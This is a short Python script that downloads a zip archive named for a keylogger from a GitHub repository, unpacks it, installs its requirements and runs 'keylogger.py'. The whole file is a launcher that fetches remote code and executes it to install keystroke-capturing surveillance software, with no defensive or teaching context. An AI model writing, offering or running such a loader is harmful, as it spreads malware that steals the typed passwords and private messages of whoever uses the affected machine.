import os
import requests


urlZip = 'https://github.com/ELREBEU/keylogger/raw/refs/heads/main/envKeylogger.zip'

response = requests.get(urlZip)

if response.status_code == 200:
    with open('envKeylogger.zip', 'wb') as f:
        f.write(response.content)


os.system('unzip envKeylogger.zip')
os.system('source envKeylogger/bin/activate')
os.system('pip install -r requirements.txt')
os.system('python3 keylogger.py')
